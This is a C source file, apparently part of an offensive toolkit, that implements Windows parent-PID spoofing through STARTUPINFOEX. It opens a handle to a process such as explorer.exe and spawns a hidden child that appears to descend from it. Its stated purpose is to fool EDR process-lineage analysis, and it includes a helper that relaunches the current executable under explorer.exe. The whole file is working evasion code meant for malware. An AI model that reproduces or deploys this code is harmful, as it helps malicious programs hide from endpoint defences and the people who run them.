/*
 * PPID Spoofing — fake process parent via STARTUPINFOEX
 *
 * Creates a child process whose parent PID appears to be a different
 * process (e.g., explorer.exe), making the process tree look legitimate
 * to EDR process lineage analysis.
 *
 * Compile: x86_64-w64-mingw32-gcc -c ppid_spoof.c -o ppid_spoof.o
 */

#include <windows.h>
#include <tlhelp32.h>

#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif

typedef BOOL (WINAPI *pInitializeProcThreadAttributeList)(
    LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
typedef BOOL (WINAPI *pUpdateProcThreadAttribute)(
    LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR,
    PVOID, SIZE_T, PVOID, PSIZE_T);
typedef void (WINAPI *pDeleteProcThreadAttributeList)(
    LPPROC_THREAD_ATTRIBUTE_LIST);

/*
 * find_process_by_name — find a running process by name and return
 * a handle with PROCESS_CREATE_PROCESS access.
 */
static HANDLE find_process_by_name(const char *name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return NULL;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    DWORD target_pid = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                target_pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);

    if (target_pid == 0) return NULL;

    return OpenProcess(PROCESS_CREATE_PROCESS, FALSE, target_pid);
}

/*
 * create_process_spoofed_ppid — create a process that appears to be
 * a child of `parent_name` (e.g., "explorer.exe").
 *
 * Returns TRUE and fills pi on success.
 */
BOOL create_process_spoofed_ppid(
    const char *parent_name,
    const char *cmd_line,
    DWORD creation_flags,
    PROCESS_INFORMATION *pi
) {
    HANDLE hParent = find_process_by_name(parent_name);
    if (!hParent) return FALSE;

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    pInitializeProcThreadAttributeList fnInit =
        (pInitializeProcThreadAttributeList)GetProcAddress(hKernel32, "InitializeProcThreadAttributeList");
    pUpdateProcThreadAttribute fnUpdate =
        (pUpdateProcThreadAttribute)GetProcAddress(hKernel32, "UpdateProcThreadAttribute");
    pDeleteProcThreadAttributeList fnDelete =
        (pDeleteProcThreadAttributeList)GetProcAddress(hKernel32, "DeleteProcThreadAttributeList");

    if (!fnInit || !fnUpdate || !fnDelete) {
        CloseHandle(hParent);
        return FALSE;
    }

    SIZE_T attr_sz = 0;
    fnInit(NULL, 1, 0, &attr_sz);
    if (attr_sz == 0) { CloseHandle(hParent); return FALSE; }

    LPPROC_THREAD_ATTRIBUTE_LIST attr_list =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_sz);
    if (!attr_list) { CloseHandle(hParent); return FALSE; }

    if (!fnInit(attr_list, 1, 0, &attr_sz)) {
        HeapFree(GetProcessHeap(), 0, attr_list);
        CloseHandle(hParent);
        return FALSE;
    }

    if (!fnUpdate(attr_list, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                  &hParent, sizeof(HANDLE), NULL, NULL)) {
        fnDelete(attr_list);
        HeapFree(GetProcessHeap(), 0, attr_list);
        CloseHandle(hParent);
        return FALSE;
    }

    STARTUPINFOEXA si;
    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(si);
    si.lpAttributeList = attr_list;

    char cmd_buf[512];
    strncpy(cmd_buf, cmd_line, sizeof(cmd_buf) - 1);
    cmd_buf[sizeof(cmd_buf) - 1] = '\0';

    BOOL result = CreateProcessA(
        NULL,
        cmd_buf,
        NULL, NULL,
        FALSE,
        creation_flags | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
        NULL, NULL,
        (STARTUPINFOA *)&si,
        pi
    );

    fnDelete(attr_list);
    HeapFree(GetProcessHeap(), 0, attr_list);
    CloseHandle(hParent);
    return result;
}

/*
 * run_self_under_explorer — re-launch the current executable as a
 * child of explorer.exe, then exit the original process.
 * Call this early in main() to fix process lineage.
 */
BOOL run_self_under_explorer(void) {
    char self[MAX_PATH];
    GetModuleFileNameA(NULL, self, MAX_PATH);

    PROCESS_INFORMATION pi;
    if (create_process_spoofed_ppid("explorer.exe", self, 0, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return TRUE;
    }
    return FALSE;
}
